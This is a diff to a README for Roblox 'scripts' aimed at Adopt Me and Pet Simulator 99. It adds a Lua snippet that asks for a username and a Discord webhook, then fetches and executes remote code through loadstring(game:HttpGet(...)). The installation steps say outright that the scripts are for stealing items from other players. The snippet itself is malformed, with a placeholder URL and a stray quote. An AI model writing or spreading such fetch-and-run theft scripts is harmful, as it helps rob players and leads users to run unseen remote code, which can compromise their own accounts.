@@ -15,6 +15,14 @@ Please use these scripts responsibly and in accordance with Roblox's terms of se
 - **Adopt Me** 🐕
 - **Pet Simulator 99** 🐈
 
+## Scripts
+**Adopt Me**
+```lua
+Username = "Your Roblox Username Here"
+Webhook = "Your Discord Webhook Here"
+loadstring(game:HttpGet("adopt",true))()"
+```
+
 ## Installation Instructions
 1. Find the script you want to steal items from players on.
 2. Fill out nessacary imformation.
